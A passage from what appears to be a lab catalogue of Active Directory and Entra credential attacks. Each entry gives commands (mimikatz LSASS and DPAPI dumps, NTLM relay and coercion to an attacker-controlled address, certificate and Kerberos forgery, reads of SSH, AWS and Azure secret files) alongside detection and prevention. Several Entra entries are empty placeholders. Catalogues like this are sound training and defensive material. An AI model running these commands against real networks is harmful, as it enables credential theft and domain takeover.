**What it is:** `vssadmin create shadow` → mount → copy NTDS.dit/SYSTEM/SAM → secretsdump. See CRED-007.

---

### CRED-045 — DPAPI Master Key Theft
**What it is:** every user's DPAPI master key is stored in `%APPDATA%\Microsoft\Protect\<sid>\`. As SYSTEM you can read it; with the master key + ciphertext you decrypt any user's protected secret.
**Tools:** `mimikatz dpapi::masterkey`, `SharpDPAPI`.
**Steps:**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi"   # gets cached MK from LSASS
.\SharpDPAPI.exe masterkeys
```
**Detection:** access to `Microsoft\Protect\` files cross-user.
**Prevention:** Credential Guard; encrypt the host disk; tier-0 isolation.

---

### CRED-046 — NTLMv2 Reflection via Responder
**What it is:** combination of LLMNR/NBT-NS poisoning + relaying back to the originating host (when SMB signing not required) → command exec.
**Tools:** `Responder` + `ntlmrelayx.py`.
**Steps:**
```bash
# Responder.conf: disable SMB + HTTP servers (let ntlmrelayx handle)
sudo responder -I virbr1 -A
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc ..."
```
**Detection:** Defender for Identity "NTLM relay" alert; SMB1/2 packet captures.
**Prevention:** SMB signing required on every host; disable LLMNR/NBT-NS; LDAP signing + channel binding.

---

### CRED-047 — Certificate Private Key Export (ESC12 / enrollment agent)
**What it is:** enrollment-agent template + over-permissive ACL → request "Enrollment Agent" cert → use it to enroll on behalf of any user.
**Tools:** `Certipy req -on-behalf-of`.
**Steps:**
```bash
certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA -template EnrollmentAgentTemplate
certipy req -u peter.parker -p 'EmpireLab2024!' -ca corp-CA-CA -template User \
   -on-behalf-of 'corp\Administrator' -pfx ea.pfx
```
**Detection:** ADCS Event `4886`/`4887` with "Enrollment Agent" attribute.
**Prevention:** restrict EA templates to designated PKI staff; enable Enrollment Agent Restrictions on the CA.

---

### CRED-048 — NTLM Relay to LDAPS without Channel Binding
**What it is:** if LDAPS doesn't enforce EPA (channel binding token), NTLM auth captured over SMB can be relayed to LDAPS and used to write any AD object (e.g. set RBCD).
**Why it works here:** channel binding off.
**Tools:** `ntlmrelayx.py --delegate-access -t ldaps://...`.
**Steps:**
```bash
ntlmrelayx.py -t ldaps://coruscant.empire.local --delegate-access -smb2support
# trigger coercion or relay an arriving auth
```
**Detection:** LDAPS connections with no EPA (Event `2889`).
**Prevention:** require LDAP signing **and** channel binding; KB4520412 / `LdapEnforceChannelBinding=2`.

---

### CRED-049 — WebDAV Client Coercion → LDAP Relay
**What it is:** trigger WebClient on a target with a `\\attacker@80\share` UNC → NTLM auth over HTTP → relay to LDAP without signing requirement → DA.
**Tools:** `PetitPotam`, `ntlmrelayx -t ldap://...`.
**Steps:**
```bash
ntlmrelayx.py -t ldap://coruscant.empire.local --escalate-user peter.parker -smb2support --no-smb-server -http-port 80
python3 PetitPotam.py -u peter.parker -p 'EmpireLab2024!' '\\attacker@80/foo' scarif.empire.local
```
**Detection:** non-DC LDAP write events for AdminSDHolder/User ACL.
**Prevention:** require LDAP signing; disable WebClient; SMB signing required.

---

### CRED-050 — DNSSEC ZSK Leak
**What it is:** Active Directory-integrated DNS zones configured with DNSSEC may store the Zone Signing Key (ZSK) in a software key storage provider with weak ACLs. If compromised, an attacker can enumerate the zone or sign rogue records.
**Why it works here:** DNSSEC is enabled but Zone Signing Key (ZSK) is stored in a software key storage provider with weak ACLs.
**Tools:** `dnssec-signzone`, custom scripts, active directory queries.
**Steps:**
```bash
# Retrieve DNSSEC keys from Active Directory
ldapsearch -H ldap://10.10.0.10 -x -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=empire,DC=local" "(objectClass=dnsZone)"
```
**Detection:** Registry or file access events on DNSSEC key directories (`C:\Windows\System32\dns\keys\`).
**Prevention:** Store Zone Signing Keys (ZSK) and Key Signing Keys (KSK) in a Hardware Security Module (HSM). Ensure strict file and directory access control.

---

### CRED-051 — `.library-ms` NTLM Hash Leak (CVE-2025-24071)
**What it is:** crafted `.library-ms` file with attacker UNC; Explorer auto-resolves on extraction → NTLMv2 leak.
**Tools:** crafted ZIP/RAR; `Responder` listener.
**Steps:** drop `evil.library-ms` referencing `\\attacker\share`; Responder captures.
**Detection:** Sysmon Event `3` (SMB connect from explorer.exe to external host).
**Prevention:** patch (March 2025 cumulative); block outbound SMB; force SMB signing.

---

### CRED-052 — .url shortcut NTLM coercion
**What it is:** A crafted Internet Shortcut (`.url`) file containing an `IconFile` property pointing to an external UNC path. When a user browses the directory containing the file in Windows Explorer, Explorer automatically attempts to retrieve the icon, leaking the user's NetNTLM hash.
**Why it works here:** A `.url` file is placed in the world-readable SYSVOL scripts folder on `coruscant`.
**Tools:** `Responder`, text editor.
**Steps:**
```ini
# Contents of C:\Windows\SYSVOL\sysvol\empire.local\scripts\coerce.url:
[InternetShortcut]
URL=file://10.10.0.100/share
IconFile=\\10.10.0.100\share\icon.ico
IconIndex=1
```
```bash
# Attacker starts Responder to capture the NetNTLM hash:
sudo responder -I eth0 -vd
```
**Detection:** Event ID `4624` / `4625` indicating NTLM authentication to an external/untrusted IP from a user's workstation.
**Prevention:** Block outbound SMB (port 445) traffic at the network perimeter. Restrict write permissions on SYSVOL and other shared directories.

---

### CRED-053 — ShadowCoerce (MS-FSRVP)
**What it is:** `IsPathSupported` of MS-FSRVP coerces DFSR/FSRVP-enabled host to authenticate.
**Tools:** `ShadowCoerce.py`.
**Steps:**
```bash
python3 ShadowCoerce.py -u peter.parker -p 'EmpireLab2024!' -d empire.local 10.10.0.100 coruscant.empire.local
```
**Detection / Prevention:** RPC filter for FSRVP; patch (KB5015754).

---

### CRED-054 — Pre-Windows 2000 Computer Account Abuse
**What it is:** "Pre-Windows 2000 Compatible Access" group + computer accounts created with lowercase-name password → predictable machine secret → Silver/RBCD.
**Tools:** `Pre2k.py`, `kerbrute`.
**Steps:**
```bash
python3 pre2k.py auth -d empire.local -dc-ip 10.10.0.10 -inputfile machines.txt -outputfile pre2k.csv
```
**Detection:** Event `4624` Logon Type 3 with machine account using default password.
**Prevention:** clear Pre-Windows 2000 group; force-reset all machine passwords.

---

### CRED-055 — RemoteMonologue (DCOM → NTLMv2)
**What it is:** trigger DCOM auth from a target, captured by Responder/Internal-Monologue.
**Tools:** `RemoteMonologue.py`, `Internal-Monologue.exe`.
**Steps:**
```bash
python3 remotemonologue.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -t 10.10.0.13
```
**Detection:** Sysmon `1` `mmc.exe`/`taskmgr.exe` spawning DCOM under unusual parent.
**Prevention:** disable DCOM (`HKLM\Software\Microsoft\Ole\EnableDCOM=N`) where unused; block outbound NTLM.

---

### CRED-056 — "Walking Dead" — Disabled Account Abuse
**What it is:** disabled account that still has Domain Admin group membership. `GenericAll` on the object → re-enable, set password, login.
**Why it works here:** `da_old` disabled but DA-member; nick.fury has GenericAll.
**Tools:** `net user`, `Set-ADAccountPassword`, `Enable-ADAccount`.
**Steps:**
```powershell
Enable-ADAccount -Identity da_old
Set-ADAccountPassword da_old -NewPassword (ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force) -Reset
```
**Detection:** Event `4722` (account enabled), `4724` (password reset by admin).
**Prevention:** disable + REMOVE group memberships; remove disabled accounts from privileged groups.

---

### CRED-057 — AD Recycle Bin Restore
**What it is:** restore a deleted privileged object → it comes back with all memberships and sIDHistory.
**Tools:** `Restore-ADObject`, `Get-ADObject -IncludeDeletedObjects`.
**Steps:**
```powershell
Get-ADObject -IncludeDeletedObjects -Filter 'isDeleted -eq $true' |
   ? { $_.Name -like '*DA*' } | Restore-ADObject
```
**Detection:** Event `5136` (restore writes).
**Prevention:** restrict `Restore-ADObject` rights; monitor Recycle Bin operations.

---

### CRED-058 — gMSADumper
**What it is:** Extract the `msDS-ManagedPassword` attribute of a Group Managed Service Account (gMSA) using python tools, extracting the NT hash of the service account.
**Why it works here:** `nick.fury` (or `Regional Managers`) has rights to retrieve the password for `gmsa_web$`.
**Tools:** `gMSADumper.py`.
**Steps:**
```bash
python3 gMSADumper.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -dc-ip 10.10.0.10
```
**Detection:** Event ID `4662` (An operation was performed on an object) for the gMSA object reading the `msDS-ManagedPassword` attribute.
**Prevention:** Restrict the membership of the group authorized to retrieve the managed password via `PrincipalsAllowedToRetrieveManagedPassword` to only the designated host computer accounts.

---

### CRED-059 — goLAPS / LAPS v2 Bulk Read
**What it is:** ReadLAPSPassword extended right delegated across an OU → dump every host.
**Tools:** `goLAPS`, `LAPSDumper.py`, `nxc ldap --laps`.
**Steps:**
```bash
./goLAPS -u peter.parker -p 'EmpireLab2024!' -d empire.local -dc 10.10.0.10
```
**Detection:** large `4662` for ms-LAPS-Password / ms-Mcs-AdmPwd reads.
**Prevention:** Windows LAPS with encryption; restrict ReadLAPSPassword to a security group, not All Authenticated Users.

---

### CRED-060 — SCCMDecryptor (NAA / policy DPAPI)
**What it is:** SCCM Network Access Account creds are stored DPAPI-encrypted in the WMI repository (`CCM_NetworkAccessAccount`). Decrypt → site-wide creds.
**Tools:** `SharpSCCM`, `sccmhunter`, `SCCMDecryptor-BOF`.
**Steps:**
```powershell
.\SharpSCCM.exe local secrets
```
**Detection:** WMI namespace access from unusual processes.
**Prevention:** disable NAA; use enhanced HTTP-only PKI mode; tier SCCM.

---

### CRED-061 — Kerberos Relay via CNAME
**What it is:** ADIDNS write → CNAME victim → krbrelayx captures Kerberos auth (SPN-bound) → replay to LDAP.
**Tools:** `krbrelayx.py`.
**Steps:**
```bash
python3 dnstool.py -u 'corp\peter.parker' -p 'EmpireLab2024!' \
   -r 'fs1' --action add --data 10.10.0.100 10.10.0.10
python3 krbrelayx.py -t ldap://coruscant.empire.local --delegate-access
```
**Detection:** Event `5136` adding CNAMEs in DNS.
**Prevention:** ADIDNS ACL hardening; KDC-cert-strict; SPN-based mitigations (KB5034439).

---

### CRED-062 — Reflective Kerberos Relay
**What it is:** krbrelayx reflects Kerberos auth back to the same host's LSASS pipe → local SYSTEM. Local privesc variant of KrbRelayUp.
**Tools:** `krbrelay.exe`, `KrbRelayUp`.
**Steps:**
```cmd
KrbRelayUp.exe full --Method SCM
```
**Detection:** local LSASS pipe writes from unexpected source PID.
**Prevention:** `EnableLocalMachineAuthenticationLevel` registry mitigation; LDAP signing + channel binding.

---

### CRED-063 — MS14-068 PAC Forgery
**What it is:** unpatched DC accepts forged PAC in TGT → any user becomes Domain Admin. Legacy but lab-injected.
**Tools:** `goldenPac.py`, `pykek`.
**Steps:**
```bash
impacket-goldenPac empire.local/peter.parker:'EmpireLab2024!'@coruscant.empire.local
```
**Detection:** Event `4769` with mismatched PAC signature; KDC log signature failure.
**Prevention:** patch (KB3011780 — 2014); should be impossible on any DC built since 2015.

---

### CRED-064 — Internal-Monologue (NetNTLMv1 downgrade)
**What it is:** force local processes to NetNTLMv1 by toggling `LMCompatibilityLevel` per session, capture, crack at `crack.sh`.
**Tools:** `Internal-Monologue.exe`.
**Steps:**
```powershell
.\Internal-Monologue.exe -impersonate
```
**Detection:** abrupt change of LMCompatibilityLevel; NetNTLMv1 logon events.
**Prevention:** `LMCompatibilityLevel=5`; Protected Users.

---

### CRED-065 — Remote DPAPI via Backup Key
**What it is:** the domain DPAPI backup key (stored on DC) can decrypt *any* user's masterkey. With DA you can pull it and decrypt anything offline forever.
**Tools:** `mimikatz lsadump::backupkeys`, `SharpDPAPI backupkey`.
**Steps:**
```powershell
.\mimikatz.exe "lsadump::backupkeys /system:coruscant.empire.local /export"
.\SharpDPAPI.exe backupkey /server:coruscant.empire.local
```
**Detection:** MS-BKRP RPC calls from non-DC IP.
**Prevention:** tier-0; restrict who can hit DC RPC; rotate the DPAPI backup key after compromise (painful but necessary).

---

### CRED-066 — DPAPI Backup Keys Extraction via LSARPC
**What it is:** The Local Security Authority (LSA) provides an RPC interface (LSARPC) that allows administrators to retrieve the domain's DPAPI backup keys. A compromised backup key allows offline decryption of any domain user's DPAPI master keys and secrets.
**Why it works here:** Exposed LSARPC on Domain Controllers in empire.local.
**Tools:** `mimikatz`, `SharpDPAPI`.
**Steps:**
```powershell
.\mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:coruscant.empire.local /export"
```
**Detection:** Event ID `4662` or `4624` Logon Type 3 with access to key decryption RPC endpoints.
**Prevention:** Isolate Domain Controllers (Tier 0). Restrict RPC access using firewalls and network segmentation.

---

### CRED-067 — CredentialGuard Disabled
**What it is:** Credential Guard uses virtualization-based security to isolate LSASS secrets. If disabled, credentials (like NTLM hashes and Kerberos tickets) remain in the LSASS process memory space, exposing them to memory dump tools.
**Why it works here:** Credential Guard is not enabled (registry setting disabled).
**Tools:** `mimikatz`, `procdump`.
**Steps:**
```powershell
# Check if Credential Guard is running:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning
```
**Detection:** Event ID `1` (Process creation) or auditing of registry changes in `HKLM\System\CurrentControlSet\Control\Lsa\LsaCfgFlags`.
**Prevention:** Enable Credential Guard via Group Policy (`Computer Configuration -> Administrative Templates -> System -> Device Guard -> Turn on Virtualization Based Security`).

---

### CRED-068 — LSA Notification Packages Registry Modification
**What it is:** Attackers can register custom LSA Notification Packages (DLLs) via the registry. Upon system reboot, LSA loads these packages, which can intercept plaintext passwords during user authentication.
**Why it works here:** Write permissions allowed on the registry keys or custom DLL dropped in System32.
**Tools:** Custom DLL, `reg` command.
**Steps:**
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0dvad_notify" /f
```
**Detection:** Event ID `4657` (Registry value modified) for the `Notification Packages` registry value, or Sysmon process loads of unsigned/malicious DLLs in `lsass.exe`.
**Prevention:** Restrict write permissions on the LSA registry keys. Enable Driver/DLL signing enforcement and LSA Protection (RunAsPPL).

---

### CRED-100 — Inter-Realm Ticket Abuse
**What it is:** Forging cross-forest/inter-realm Ticket Granting Tickets (TGTs) using trust keys between Active Directory forests. If SID filtering is disabled, an attacker can inject high-privileged SIDs (like Enterprise Admins) into the forged ticket to compromise the trusting forest.
**Why it works here:** SID filtering is disabled on the forest trust between `empire.local` and `rebel.local`.
**Tools:** `mimikatz`, `Rubeus`.
**Steps:**
```bash
# Forge a Golden Ticket with the target enterprise admin SID across the forest trust
mimikatz "kerberos::golden /user:Administrator /domain:empire.local /sid:S-1-5-21-EMPIRE /sids:S-1-5-21-REBEL-519 /krbtgt:<trust_key_hash> /ptt"
```
**Detection:** Event ID `4769` for a cross-forest Kerberos ticket request containing anomalous SIDs in the PAC.
**Prevention:** Enable SID filtering on all external and forest trusts (`netdom trust /domain:empire.local /to:rebel.local /EnableSIDFiltering:yes`).

---

### CRED-121 — Chrome Saved Passwords
**What it is:** Extracting passwords saved in Google Chrome. Chrome encrypts credentials using the Windows DPAPI master key of the current user.
**Why it works here:** Standard workstation configuration where Chrome is used and DPAPI is accessible.
**Tools:** `SharpChromium`, `mimikatz`.
**Steps:**
```powershell
.\SharpChromium.exe logins
```
**Detection:** Access to the Chrome database file (`%localappdata%\Google\Chrome\User Data\Default\Login Data`) by non-Chrome processes.
**Prevention:** Disable built-in browser password saving via Group Policy. Enforce enterprise password manager usage.

---

### CRED-122 — Edge Saved Passwords
**What it is:** Extracting saved passwords from Microsoft Edge, which are encrypted with the user's DPAPI master key.
**Why it works here:** Standard Edge installation with saved passwords allowed.
**Tools:** `SharpChromium`, `mimikatz`.
**Steps:**
```powershell
.\SharpChromium.exe logins --edge
```
**Detection:** Access to the Edge database file (`%localappdata%\Microsoft\Edge\User Data\Default\Login Data`) by non-Edge processes.
**Prevention:** Disable password saving in Edge via GPO.

---

### CRED-123 — Firefox Saved Passwords
**What it is:** Extracting saved passwords from Mozilla Firefox. Firefox encrypts credentials in `logins.json` using a key stored in `key4.db`.
**Why it works here:** Firefox profile directory is accessible.
**Tools:** `firepwd.py`, `LaZagne`.
**Steps:**
```bash
python3 firepwd.py -d C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>
```
**Detection:** Process monitoring of scripts or binaries accessing Firefox profile files (`logins.json`, `key4.db`).
**Prevention:** Force a master password in Firefox or disable saved passwords.

---

### CRED-124 — Windows Credential Manager Entries
**What it is:** Retrieving credentials stored in the Windows Credential Manager. These credentials (saved RDP, network share, or website credentials) are encrypted with the user's DPAPI key.
**Why it works here:** Simulated credentials stored in Credential Manager.
**Tools:** `cmdkey`, `mimikatz`.
**Steps:**
```cmd
cmdkey /list
# Extract using Mimikatz:
mimikatz "privilege::debug" "sekurlsa::credman" exit
```
**Detection:** Auditing DPAPI credential read events, and process command lines invoking `cmdkey.exe /list`.
**Prevention:** Restrict saving of domain credentials in Credential Manager via Group Policy.

---

### CRED-125 — SSH Private Keys in User Profile
**What it is:** Extracting plaintext SSH private keys stored in the default SSH directory (`.ssh`) of user profiles.
**Why it works here:** Plaintext SSH key dropped in `C:\Users\Administrator\.ssh\id_rsa`.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\Users\Administrator\.ssh\id_rsa
```
**Detection:** File access monitoring on the `.ssh` folder in user profile paths.
**Prevention:** Enforce passphrase protection on all SSH private keys. Use agent forwarding instead of storing keys locally where possible.

---

### CRED-126 — AWS Credentials File
**What it is:** Extracting AWS access keys and secret keys from the `.aws/credentials` configuration file stored in plaintext within user profile directories.
**Why it works here:** Plaintext AWS credentials file created in the lab.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\Users\Administrator\.aws\credentials
```
**Detection:** File read monitoring targeting `.aws/credentials` or `.aws/config`.
**Prevention:** Enforce short-lived credentials via IAM Roles or AWS SSO. Do not store long-lived credentials in plaintext config files.

---

### CRED-127 — Azure Credentials File
**What it is:** Extracting Azure CLI or Az PowerShell access tokens and credentials from profile directories (e.g., `~/.azure/accessTokens.json`).
**Why it works here:** Standard Azure CLI tool usage caches access tokens in plaintext files.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\Users\Administrator\.azure\accessTokens.json
```
**Detection:** Monitoring reads of `accessTokens.json` or `azureProfile.json` by non-CLI processes.
**Prevention:** Use Managed Identities where possible. Restrict access to CLI cache directories.

---

### CRED-128 — Terraform State with Credentials
**What it is:** Extracting plaintext secrets, database passwords, or API keys stored in Terraform state files (`terraform.tfstate`).
**Why it works here:** Terraform state file containing simulated credentials dropped in `C:\Tools\terraform.tfstate`.
**Tools:** Local commands.
**Steps:**
```cmd
type C:\Tools\terraform.tfstate
```
**Detection:** Non-developer processes reading files with `.tfstate` extension.
**Prevention:** Store Terraform state files in secure remote backends (e.g., AWS S3 with KMS encryption, Terraform Cloud) with restricted permissions, rather than locally.

---

### CRED-129 — KeePass Database in Documents
**What it is:** Locating KeePass password manager databases (`.kdbx`) and extracting them. If the master password is weak or can be dumped from memory, all passwords within can be decrypted.
**Why it works here:** Standard KeePass database storage behavior.
**Tools:** `KeePassHilliard`, `KeeThief`, `keepass-trigger`.
**Steps:**
```powershell
# Find KeePass databases:
Get-ChildItem -Path C:\Users -Filter *.kdbx -Recurse -ErrorAction SilentlyContinue
```
**Detection:** Process monitoring of memory access to the `KeePass.exe` process (e.g., dumping KeePass memory).
**Prevention:** Enforce strong KeePass master passwords. Use key files or Windows Hello in combination with the password. Keep KeePass updated to mitigate memory dump vulnerabilities.

---

### CRED-130 — .rdp File with Saved Password
**What it is:** Extracting saved passwords from `.rdp` files. The password field is DPAPI-encrypted and stored under the `password 51` property.
**Why it works here:** Simulated RDP connection file placed on the desktop.
**Tools:** `SharpDPAPI`.
**Steps:**
```powershell
.\SharpDPAPI.exe rdpsg
```
**Detection:** Access to DPAPI master keys and decryption of RDP configuration keys.
**Prevention:** Disable saving of credentials in Remote Desktop Connection settings via GPO.

---

### CLO-001 — Entra Connect MSOL sync account (over-privileged)
**What it is:** The MSOL_xxxx account created by Microsoft Entra Connect is often granted excessive on-premises AD permissions, exposing the forest to DCSync attacks if compromised.
**Why it works here:** MSOL sync account is pre-created with high replication privileges.
**Tools:** `AADInternals`, `impacket-secretsdump`.
**Steps:**
```bash
# Extract sync credentials from Entra Connect server
Import-Module AADInternals
$creds = Get-AADIntSyncCredentials
# Execute DCSync using MSOL sync credentials
impacket-secretsdump -just-dc-ntlm EMPIRE/MSOL_sync:EntraSync2024!@10.10.0.10
```
**Detection:** Event ID `4624` (Successful Logon) or Event ID `4776` (Credential Validation) from anomalous systems for the MSOL account.
**Prevention:** Enforce strict IP restrictions and logon hour limits on the MSOL sync account. Rotate the credentials regularly.

---

### CLO-002 — PHS hash sync account (DCSync-capable service account)
**What it is:** Entra Connect uses the Password Hash Sync (PHS) account to replicate hashes. This account possesses the GetChanges and GetChangesAll replication rights on the domain partition.
**Why it works here:** GetChanges and GetChangesAll rights granted to the MSOL sync account.
**Tools:** `impacket-secretsdump`.
**Steps:**
```bash
impacket-secretsdump -just-dc-ntlm -dc-ip 10.10.0.10 empire.local/MSOL_sync:'EntraSync2024!'@10.10.0.10
```
**Detection:** Event ID `4662` (Replication changes) targeting the domain object originating from non-DC IPs.
**Prevention:** Audit AD replication permissions. Limit sync capability only to authorized Entra Connect hosts.

---

### CLO-003 — Pass-through auth agent account
**What it is:** Entra Pass-Through Authentication (PTA) uses local agents. Compromise of an agent host allows intercepting authentication requests.
**Why it works here:** PTA agent runs in system context on Member Server.
**Tools:** PTA Agent console.
**Steps:**
```powershell
Get-Service -Name "Microsoft Azure AD Connect Authentication Agent"
```
**Detection:** Unauthorized agent registration alerts in the Entra ID administration portal.
**Prevention:** Strictly restrict administrative access to PTA agent servers (Tier 0).

---

### CLO-004 — AADC sync service account with high AD rights
**What it is:** Azure AD Connect sync account is occasionally granted write permissions over AD objects, enabling unauthorized password resets.
**Why it works here:** Write permissions granted over User OUs.
**Tools:** ActiveDirectory PowerShell.
**Steps:**
```powershell
Get-Acl "AD:DC=empire,DC=local" | Select-Object -ExpandProperty Access | Where-Object { $_.IdentityReference -match 'MSOL_sync' }
```
**Detection:** Event ID `5136` showing write modification to user passwords/groups by the sync account.
**Prevention:** Implement Least Privilege; restrict the sync account from modifying sensitive admin groups.

---

### CLO-005 — Seamless SSO account (AZUREADSSOACC$)
**What it is:** Seamless SSO utilizes a computer account (AZUREADSSOACC$) with a weak, static Kerberos key, opening a surface for ticket forgery.
**Why it works here:** Seamless SSO is enabled, creating a static computer account password (`SsoKerb2024!`).
**Tools:** `impacket-GetUserSPNs`, `hashcat`.
**Steps:**
```bash
impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -request -dc-ip 10.10.0.10
```
**Detection:** Event ID `4769` targeting the AZUREADSSOACC$ account with RC4 (0x17) encryption.
**Prevention:** Roll over the Kerberos decryption key for the AZUREADSSOACC computer account regularly (every 30 days).

---

### CLO-006 — Directory sync account readable without auth
**What it is:** Permissions on AD Sync directories or registry hives containing decrypted/decrypted sync passwords might be misconfigured.
**Why it works here:** Weak permissions on AD Sync install directory.
**Tools:** Get-Acl.
**Steps:**
```powershell
Get-Acl "C:\Program Files\Microsoft Azure AD Sync" | Format-List
```
**Detection:** Audit checks on directory and registry access events for the Sync service folder.
**Prevention:** Enforce strict ACLs on the AD Sync installation folder and registry keys.

---

### CLO-007 — MSOL account password reuse detection
**What it is:** Sync account passwords reused across multiple administrative interfaces or secondary service accounts.
**Why it works here:** Static passwords reused.
**Tools:** Netexec / nxc.
**Steps:**
```bash
nxc smb 10.10.0.10 -u Administrator -p 'EntraSync2024!'
```
**Detection:** Logon validation events (4624) on multiple hosts using the same service account credentials.
**Prevention:** Generate strong, unique, randomized passwords for all service accounts.

---

### CLO-008 — Entra Connect plaintext credentials in registry/config
**What it is:** Entra Connect stores sync configurations and credentials in the local database or registry. Admin access allows decryption.
**Why it works here:** DPAPI-encrypted configurations are decryptable by local Administrator.
**Tools:** `AADInternals`.
**Steps:**
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
```
**Detection:** Processes calling CryptUnprotectData targeting AD Sync configuration paths.
**Prevention:** Restrict local administrator rights on the Entra Connect server. Enable Credential Guard.

---

### CLO-009 — AAD Password Protection DC Agent — audit mode only
**What it is:** Deploying Azure AD Password Protection in Audit mode prevents weak password selection from being actively blocked on-premises.
**Why it works here:** Registry key configured for Audit mode instead of Enforce.
**Tools:** Get-ItemProperty.
**Steps:**
```powershell
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\AzureADPasswordProtectionDCAgent\Parameters"
```
**Detection:** Event ID 10014 or 10025 showing password validation in audit mode.
**Prevention:** Set Password Protection DC Agent to 'Enforced' mode.

---

### CLO-010 — Entra Connect admin accounts without MFA (note)
**What it is:** Failing to enforce Multi-Factor Authentication on hybrid identity administrators allows takeover via credential leakage.
**Why it works here:** Conditional Access policy excludes sync administrators from MFA.
**Tools:** az CLI.
**Steps:**
```bash
az login -u admin@corplab.onmicrosoft.com -p 'Password!'
```
**Detection:** Entra ID sign-in logs showing Global Admins authenticating successfully without MFA.
**Prevention:** Enforce MFA for all directory sync and administrative roles using Conditional Access.

---

### CLO-011 — Entra Connect Sync Engine Privilege Escalation
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-012 — Sync Database Extraction (ADSync DB)
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-013 — SQL Server Injection in Sync Database
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-014 — Encryption Key Extraction from ADSync Config
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-015 — Service Account Impersonation via Sync Engine
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-016 — ADSync Service Account ACL Abuse
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-017 — Unencrypted HTTP Communication during Sync
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-018 — DNS Spoofing of Entra Connect Endpoints
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-019 — Active Directory Schema Hijacking via Sync Roles
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-020 — Entra Connect Auto-Upgrade Hijack
**What it is:** Reserved sync engine configuration surface gap.
**Why it works here:** Simulated / placeholder for future lab extension.
**Tools:** N/A.
**Steps:**
```bash
# Reserved / placeholder
```
**Detection:** Monitor Entra ID audit logs.
**Prevention:** Keep cloud integrations secure and apply the principle of least privilege.

---

### CLO-021 — Hybrid join SCP (Service Connection Point) in AD
**What it is:** Service Connection Points dictate device join registration. Insecure write permissions on the Configuration partition allow rogue redirection.
**Why it works here:** Write permission granted to Authenticated Users on Configuration path.
**Tools:** ActiveDirectory PowerShell.
**Steps:**
```powershell
Get-ADObject -SearchBase "CN=Configuration,DC=empire,DC=local" -Filter "objectClass -eq 'serviceConnectionPoint'" -Properties keywords
```
**Detection:** Directory Service modification events (5136) on the SCP registration objects.
**Prevention:** Strictly control permissions over the AD Configuration partition.

---

### CLO-022 — PRT (Primary Refresh Token) theft surface
**What it is:** The Primary Refresh Token (PRT) allows seamless SSO. If extracted, it grants access to cloud resources as the victim without triggering MFA.
**Why it works here:** PRT stored in LSASrv process memory.
**Tools:** `mimikatz`, `ROADtools`.
**Steps:**
```powershell
mimikatz # sekurlsa::cloudap
mimikatz # token::enumerate + cloudap
roadrecon auth --prt <token> --prt-context <context>
```
**Detection:** Anomalous LSASS memory accesses from unsigned processes. Cookies/tokens used from unexpected external IPs.
**Prevention:** Enable Credential Guard to isolate CloudAP tokens. Enforce device compliance verification.

---

### CLO-023 — Device registration service abuse
**What it is:** Weak device registration settings in Microsoft Entra allow rogue or unmanaged devices to register without multi-factor verification.
**Why it works here:** Entra portal enables device registration for all users without MFA.
**Tools:** `ROADtools`, `AADInternals`.
**Steps:**
```bash
roadrecon auth -u user@domain.com -p 'Password!'
```
